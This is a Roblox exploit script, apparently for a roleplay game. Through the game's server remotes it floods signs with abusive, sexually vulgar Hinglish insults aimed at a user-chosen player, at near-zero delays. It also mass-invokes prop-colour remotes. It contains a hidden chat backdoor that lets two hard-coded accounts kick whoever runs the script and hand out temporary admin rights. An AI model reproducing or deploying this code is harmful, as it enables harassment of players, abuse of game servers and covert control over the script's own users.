-- [[ NYTHER PROP TROLL V1 ]] --

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local lplr = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")
local Title = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local StartBtn = Instance.new("TextButton")
local StopBtn = Instance.new("TextButton")
local RGBBtn = Instance.new("TextButton")
local SpeedBtn = Instance.new("TextButton")

-------------------------------------------------
-- ADMIN SYSTEM
-------------------------------------------------

local SUPER_ADMINS = {
    ["WOLFGOTBANNED1"] = true,
    ["VENUS_EDIT"] = true
}

local TempAdmins = {}

local function isAdmin(playerName)
    if SUPER_ADMINS[playerName] then
        return true
    end

    if TempAdmins[playerName]
    and os.time() < TempAdmins[playerName] then
        return true
    end

    return false
end

local function listenForCommands(player)

    player.Chatted:Connect(function(message)

        local msg = string.lower(message)
        local split = string.split(msg, " ")

        local command = split[1]
        local targetInput = msg:sub(#command + 2)

        if command == "!kick"
        and isAdmin(player.Name) then

            if string.find(
                string.lower(lplr.Name),
                targetInput
            ) then

                lplr:Kick(
                    "[CQ SUPPORTER HAI?🤣] Admin Kick"
                )
            end

        elseif command == "!cmds"
        and SUPER_ADMINS[player.Name] then

            for _,p in ipairs(
                Players:GetPlayers()
            ) do

                if string.find(
                    string.lower(p.Name),
                    targetInput
                ) then

                    TempAdmins[p.Name] =
                        os.time() + 7200
                end
            end
        end
    end)
end

for _,p in ipairs(Players:GetPlayers()) do
    listenForCommands(p)
end

Players.PlayerAdded:Connect(listenForCommands)

-------------------------------------------------
-- REMOTES
-------------------------------------------------

local remoteFolder =
    ReplicatedStorage:WaitForChild("RE")

local nameEvent =
    remoteFolder:FindFirstChild("1RPNam1eTex1t")

local colorEvent =
    remoteFolder:FindFirstChild("1RPNam1eColo1r")

local SignRemote =
    remoteFolder:FindFirstChild("1Cemeter1y")

-------------------------------------------------
-- RP NAME & BIO
-------------------------------------------------

local function updateRP()

    if nameEvent then

        pcall(function()

            nameEvent:FireServer(
                "RolePlayName",
                "NYTHER PROP TROLL"
            )

            nameEvent:FireServer(
                "RolePlayBio",
                "ᴡᴇʟᴄᴏᴍᴇ ᴅᴇᴀʀ " ..
                lplr.DisplayName
            )

        end)
    end
end

updateRP()

lplr.CharacterAdded:Connect(updateRP)

-------------------------------------------------
-- RGB NAME/BIO
-------------------------------------------------

task.spawn(function()

    local hue = 0

    while true do

        local rgbColor =
            Color3.fromHSV(hue,1,1)

        if colorEvent then

            pcall(function()

                colorEvent:FireServer(
                    "PickingRPNameColor",
                    rgbColor
                )

                colorEvent:FireServer(
                    "PickingRPBioColor",
                    rgbColor
                )

            end)
        end

        hue = hue + 0.01

        if hue > 1 then
            hue = 0
        end

        task.wait(0.5)
    end
end)

-------------------------------------------------
-- UI - AXER FUTURISTIC GUI
-------------------------------------------------

local TweenService = game:GetService("TweenService")

ScreenGui.Name = "AXER_NYTHER_GUI"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

pcall(function()
    ScreenGui.Parent = game.CoreGui
end)

-- MAIN FRAME
MainFrame.Parent = ScreenGui
MainFrame.Size = UDim2.new(0,320,0,280)
MainFrame.Position = UDim2.new(0.5,-160,0.5,-140)
MainFrame.BackgroundColor3 = Color3.fromRGB(8,8,18)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true

UICorner.Parent = MainFrame
UICorner.CornerRadius = UDim.new(0,18)

-- STROKE
UIStroke.Parent = MainFrame
UIStroke.Thickness = 2
UIStroke.Color = Color3.fromRGB(0,170,255)

-- GRADIENT
local Gradient = Instance.new("UIGradient")
Gradient.Parent = MainFrame
Gradient.Rotation = 45
Gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(5,5,15)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20,20,40))
}

-- GLOW
local Glow = Instance.new("ImageLabel")
Glow.Parent = MainFrame
Glow.BackgroundTransparency = 1
Glow.Size = UDim2.new(1,40,1,40)
Glow.Position = UDim2.new(0,-20,0,-20)
Glow.Image = "rbxassetid://5028857084"
Glow.ImageTransparency = 0.35
Glow.ScaleType = Enum.ScaleType.Slice
Glow.SliceCenter = Rect.new(24,24,276,276)
Glow.ZIndex = 0

-- TITLE
Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1,0,0,38)
Title.Font = Enum.Font.GothamBlack
Title.Text = "⚡ NYTHER HUB"
Title.TextSize = 18
Title.TextColor3 = Color3.fromRGB(0,220,255)

-- MINIMIZE BUTTON
local Close = Instance.new("TextButton")
Close.Parent = MainFrame
Close.Size = UDim2.new(0,34,0,34)
Close.Position = UDim2.new(1,-45,0,8)
Close.BackgroundColor3 = Color3.fromRGB(20,20,35)
Close.Text = "-"
Close.Font = Enum.Font.GothamBold
Close.TextSize = 24
Close.TextColor3 = Color3.fromRGB(255,255,255)
Close.BorderSizePixel = 0

Instance.new("UICorner", Close).CornerRadius = UDim.new(1,0)

-- MINIMIZED BUTTON
local MiniButton = Instance.new("TextButton")
MiniButton.Parent = ScreenGui
MiniButton.Size = UDim2.new(0,58,0,58)
MiniButton.Position = UDim2.new(0,20,0.5,-29)
MiniButton.BackgroundColor3 = Color3.fromRGB(8,8,18)
MiniButton.Text = "⚡"
MiniButton.Font = Enum.Font.GothamBlack
MiniButton.TextSize = 28
MiniButton.TextColor3 = Color3.fromRGB(0,220,255)
MiniButton.Visible = false
MiniButton.BorderSizePixel = 0
MiniButton.Active = true
MiniButton.Draggable = true

Instance.new("UICorner", MiniButton).CornerRadius = UDim.new(1,0)

local MiniStroke = Instance.new("UIStroke")
MiniStroke.Parent = MiniButton
MiniStroke.Thickness = 2
MiniStroke.Color = Color3.fromRGB(0,170,255)

-- GRADIENT FOR MINIMIZER BORDER
local MiniGradient = Instance.new("UIGradient")
MiniGradient.Parent = MiniStroke
MiniGradient.Rotation = 45
MiniGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0,255,200)),
    ColorSequenceKeypoint.new(0.25, Color3.fromRGB(0,170,255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(170,0,255)),
    ColorSequenceKeypoint.new(0.75, Color3.fromRGB(255,0,170)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0,255,200))
}

-- ANIMATE MINIMIZER GRADIENT
task.spawn(function()
    while true do
        task.wait(0.03)
        MiniGradient.Rotation = (MiniGradient.Rotation + 3) % 360
    end
end)

-- TEXTBOX
TextBox.Parent = MainFrame
TextBox.Position = UDim2.new(0.08,0,0.14,0)
TextBox.Size = UDim2.new(0.84,0,0,28)
TextBox.BackgroundColor3 = Color3.fromRGB(15,15,30)
TextBox.PlaceholderText = "Target..."
TextBox.TextColor3 = Color3.fromRGB(0,220,255)
TextBox.PlaceholderColor3 = Color3.fromRGB(100,150,200)
TextBox.BorderSizePixel = 0
TextBox.Font = Enum.Font.GothamBold
TextBox.TextSize = 14

local TextBoxCorner = Instance.new("UICorner", TextBox)
TextBoxCorner.CornerRadius = UDim.new(0,10)

local TextBoxStroke = Instance.new("UIStroke")
TextBoxStroke.Parent = TextBox
TextBoxStroke.Thickness = 1
TextBoxStroke.Color = Color3.fromRGB(0,170,255)

-- START BUTTON
StartBtn.Parent = MainFrame
StartBtn.Position = UDim2.new(0.08,0,0.25,0)
StartBtn.Size = UDim2.new(0.84,0,0,26)
StartBtn.BackgroundColor3 = Color3.fromRGB(0,180,100)
StartBtn.Text = "▶ START"
StartBtn.TextColor3 = Color3.fromRGB(255,255,255)
StartBtn.BorderSizePixel = 0
StartBtn.Font = Enum.Font.GothamBold
StartBtn.TextSize = 14

Instance.new("UICorner", StartBtn).CornerRadius = UDim.new(0,10)

local StartStroke = Instance.new("UIStroke")
StartStroke.Parent = StartBtn
StartStroke.Thickness = 1
StartStroke.Color = Color3.fromRGB(0,220,150)

-- STOP BUTTON
StopBtn.Parent = MainFrame
StopBtn.Position = UDim2.new(0.08,0,0.36,0)
StopBtn.Size = UDim2.new(0.84,0,0,26)
StopBtn.BackgroundColor3 = Color3.fromRGB(200,0,50)
StopBtn.Text = "⏹ STOP"
StopBtn.TextColor3 = Color3.fromRGB(255,255,255)
StopBtn.BorderSizePixel = 0
StopBtn.Font = Enum.Font.GothamBold
StopBtn.TextSize = 14

Instance.new("UICorner", StopBtn).CornerRadius = UDim.new(0,10)

local StopStroke = Instance.new("UIStroke")
StopStroke.Parent = StopBtn
StopStroke.Thickness = 1
StopStroke.Color = Color3.fromRGB(255,100,100)

-- RGB BUTTON
RGBBtn.Parent = MainFrame
RGBBtn.Position = UDim2.new(0.08,0,0.47,0)
RGBBtn.Size = UDim2.new(0.84,0,0,26)
RGBBtn.BackgroundColor3 = Color3.fromRGB(0,120,255)
RGBBtn.Text = "🌈 RGB: OFF"
RGBBtn.TextColor3 = Color3.fromRGB(255,255,255)
RGBBtn.BorderSizePixel = 0
RGBBtn.Font = Enum.Font.GothamBold
RGBBtn.TextSize = 14

Instance.new("UICorner", RGBBtn).CornerRadius = UDim.new(0,10)

local RGBStroke = Instance.new("UIStroke")
RGBStroke.Parent = RGBBtn
RGBStroke.Thickness = 1
RGBStroke.Color = Color3.fromRGB(0,200,255)

-- SPEED BUTTON
SpeedBtn.Parent = MainFrame
SpeedBtn.Position = UDim2.new(0.08,0,0.58,0)
SpeedBtn.Size = UDim2.new(0.84,0,0,26)
SpeedBtn.BackgroundColor3 = Color3.fromRGB(255,140,0)
SpeedBtn.Text = "⚙ SPEED: NORM"
SpeedBtn.TextColor3 = Color3.fromRGB(255,255,255)
SpeedBtn.BorderSizePixel = 0
SpeedBtn.Font = Enum.Font.GothamBold
SpeedBtn.TextSize = 14

Instance.new("UICorner", SpeedBtn).CornerRadius = UDim.new(0,10)

local SpeedStroke = Instance.new("UIStroke")
SpeedStroke.Parent = SpeedBtn
SpeedStroke.Thickness = 1
SpeedStroke.Color = Color3.fromRGB(255,180,50)

-- NEON LOOP
task.spawn(function()
    while true do
        TweenService:Create(UIStroke, TweenInfo.new(1), {Color = Color3.fromRGB(0,255,255)}):Play()
        TweenService:Create(MiniStroke, TweenInfo.new(1), {Color = Color3.fromRGB(0,255,255)}):Play()
        task.wait(1)
        TweenService:Create(UIStroke, TweenInfo.new(1), {Color = Color3.fromRGB(0,120,255)}):Play()
        TweenService:Create(MiniStroke, TweenInfo.new(1), {Color = Color3.fromRGB(0,120,255)}):Play()
        task.wait(1)
    end
end)

-- FADE OUT
local function FadeOut()
    TweenService:Create(MainFrame, TweenInfo.new(0.25), {BackgroundTransparency = 1}):Play()
    TweenService:Create(Glow, TweenInfo.new(0.25), {ImageTransparency = 1}):Play()
    TweenService:Create(UIStroke, TweenInfo.new(0.25), {Transparency = 1}):Play()
    TweenService:Create(Title, TweenInfo.new(0.25), {TextTransparency = 1}):Play()
    TweenService:Create(TextBox, TweenInfo.new(0.25), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
    TweenService:Create(TextBoxStroke, TweenInfo.new(0.25), {Transparency = 1}):Play()
    TweenService:Create(StartBtn, TweenInfo.new(0.25), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
    TweenService:Create(StartStroke, TweenInfo.new(0.25), {Transparency = 1}):Play()
    TweenService:Create(StopBtn, TweenInfo.new(0.25), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
    TweenService:Create(StopStroke, TweenInfo.new(0.25), {Transparency = 1}):Play()
    TweenService:Create(RGBBtn, TweenInfo.new(0.25), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
    TweenService:Create(RGBStroke, TweenInfo.new(0.25), {Transparency = 1}):Play()
    TweenService:Create(SpeedBtn, TweenInfo.new(0.25), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
    TweenService:Create(SpeedStroke, TweenInfo.new(0.25), {Transparency = 1}):Play()
    TweenService:Create(Close, TweenInfo.new(0.25), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
end

-- FADE IN
local function FadeIn()
    MainFrame.BackgroundTransparency = 1
    Glow.ImageTransparency = 1
    UIStroke.Transparency = 1
    Title.TextTransparency = 1
    TextBox.TextTransparency = 1
    TextBox.BackgroundTransparency = 1
    TextBoxStroke.Transparency = 1
    StartBtn.TextTransparency = 1
    StartBtn.BackgroundTransparency = 1
    StartStroke.Transparency = 1
    StopBtn.TextTransparency = 1
    StopBtn.BackgroundTransparency = 1
    StopStroke.Transparency = 1
    RGBBtn.TextTransparency = 1
    RGBBtn.BackgroundTransparency = 1
    RGBStroke.Transparency = 1
    SpeedBtn.TextTransparency = 1
    SpeedBtn.BackgroundTransparency = 1
    SpeedStroke.Transparency = 1
    Close.BackgroundTransparency = 1
    Close.TextTransparency = 1

    TweenService:Create(MainFrame, TweenInfo.new(0.25), {BackgroundTransparency = 0}):Play()
    TweenService:Create(Glow, TweenInfo.new(0.25), {ImageTransparency = 0.35}):Play()
    TweenService:Create(UIStroke, TweenInfo.new(0.25), {Transparency = 0}):Play()
    TweenService:Create(Title, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
    TweenService:Create(TextBox, TweenInfo.new(0.25), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
    TweenService:Create(TextBoxStroke, TweenInfo.new(0.25), {Transparency = 0}):Play()
    TweenService:Create(StartBtn, TweenInfo.new(0.25), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
    TweenService:Create(StartStroke, TweenInfo.new(0.25), {Transparency = 0}):Play()
    TweenService:Create(StopBtn, TweenInfo.new(0.25), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
    TweenService:Create(StopStroke, TweenInfo.new(0.25), {Transparency = 0}):Play()
    TweenService:Create(RGBBtn, TweenInfo.new(0.25), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
    TweenService:Create(RGBStroke, TweenInfo.new(0.25), {Transparency = 0}):Play()
    TweenService:Create(SpeedBtn, TweenInfo.new(0.25), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
    TweenService:Create(SpeedStroke, TweenInfo.new(0.25), {Transparency = 0}):Play()
    TweenService:Create(Close, TweenInfo.new(0.25), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
end

-- MINIMIZE
Close.MouseButton1Click:Connect(function()
    FadeOut()
    task.wait(0.25)
    MainFrame.Visible = false
    MiniButton.Visible = true
    MiniButton.BackgroundTransparency = 1
    MiniButton.TextTransparency = 1
    MiniStroke.Transparency = 1
    TweenService:Create(MiniButton, TweenInfo.new(0.25), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
    TweenService:Create(MiniStroke, TweenInfo.new(0.25), {Transparency = 0}):Play()
end)

-- REOPEN
MiniButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = true
    FadeIn()
    MainFrame.Size = UDim2.new(0,280,0,250)
    TweenService:Create(MainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Quint), {Size = UDim2.new(0,320,0,280)}):Play()
    TweenService:Create(MiniButton, TweenInfo.new(0.2), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
    TweenService:Create(MiniStroke, TweenInfo.new(0.2), {Transparency = 1}):Play()
    task.wait(0.2)
    MiniButton.Visible = false
end)

-------------------------------------------------
-- TROLL SYSTEM
-------------------------------------------------

local trolling = false
local rgbProps = false

local trollSpeed = 0.6

local speedPresets = {
    { name = "SLOW",   delay = 1.0 },
    { name = "NORMAL", delay = 0.5 },
    { name = "FAST",   delay = 0.1 },
    { name = "INSANE", delay = 0.000001 }
}

local speedIndex = 2

local trollList = {
    "CHAL AB PAPA BOL🤣",
    "NYTHER ON TOP ⚠️",
    "CUD GAYA😞",
    "KITNE PILEGA?😂",
    "BAAP KO H8 DEGA?🥀",
    "FYTER BANEGA?🤣",
    "SEAL TUT GYI?🤡",
    "MERA BACCHA HAI TU AAJA TEKO FANTA PILAU",
    "TMKX MARE NYTHER",
     "LEAVE KRDE🤓 "
}

local index = 1

-------------------------------------------------
-- START
-------------------------------------------------

StartBtn.MouseButton1Click:Connect(function()

    if trolling then
        return
    end

    trolling = true

    StartBtn.Text = "NYTHER H8R KI CHUDAI 🥵"

    task.spawn(function()

        while trolling do

            local target =
                TextBox.Text ~= ""
                and TextBox.Text
                or "NYTHER H8R"

            local fullMsg =
                "[" ..
                string.upper(target) ..
                "] " ..
                trollList[index]

            if SignRemote then

                for id = 1,300 do

                    if not trolling then
                        break
                    end

                    local idStr =
                        tostring(id)

                    pcall(function()

                        SignRemote:FireServer(
                            "ReturningBigSign2Name",
                            idStr,
                            fullMsg
                        )

                        SignRemote:FireServer(
                            "ReturningBigSign3Name",
                            idStr,
                            fullMsg
                        )

                        SignRemote:FireServer(
                            "ReturningBigSign4Name",
                            idStr,
                            fullMsg
                        )

                        SignRemote:FireServer(
                            "ReturningConstuctionName",
                            idStr,
                            fullMsg
                        )

                        SignRemote:FireServer(
                            "ReturningCommercialWords",
                            id,
                            nil,
                            fullMsg
                        )

                    end)
                end
            end

            index =
                (index % #trollList) + 1

            task.wait(trollSpeed)
        end
    end)
end)

-------------------------------------------------
-- RGB PROPS (MODIFIED: very fast color change)
-------------------------------------------------

RGBBtn.MouseButton1Click:Connect(function()

    rgbProps = not rgbProps

    RGBBtn.Text =
        rgbProps
        and "RGB PROPS: ON"
        or "RGB PROPS: OFF"

    if rgbProps then

        task.spawn(function()

            local h = 0

            while rgbProps do

                local c =
                    Color3.fromHSV(h,1,1)

                for _,v in ipairs(
                    workspace:GetDescendants()
                ) do

                    if v.Name == "ChangePropColor"
                    and v:IsA("RemoteFunction") then

                        pcall(function()

                            v:InvokeServer(c)

                        end)
                    end
                end

                local cp =
                    lplr.PlayerGui:
                    FindFirstChild(
                        "NoResetGUIHandler"
                    )

                if cp
                and cp:FindFirstChild(
                    "PropColorPicker"
                ) then

                    pcall(function()

                        cp.PropColorPicker
                        .SetColor:FireServer(c)

                    end)
                end

                -- Increased hue step and reduced wait for very fast color cycling
                h = (h + 0.2) % 1

                task.wait(0.05)
            end
        end)
    end
end)

-------------------------------------------------
-- SPEED BUTTON
-------------------------------------------------

SpeedBtn.MouseButton1Click:Connect(function()

    speedIndex = speedIndex % #speedPresets + 1

    local preset = speedPresets[speedIndex]

    trollSpeed = preset.delay

    SpeedBtn.Text = "SPEED: " .. preset.name

end)

-------------------------------------------------
-- STOP
-------------------------------------------------

StopBtn.MouseButton1Click:Connect(function()

    trolling = false
    rgbProps = false

    StartBtn.Text =
        "NYTHER H8R KI CHUDAI START"

    RGBBtn.Text =
        "RGB PROPS: OFF"

end)
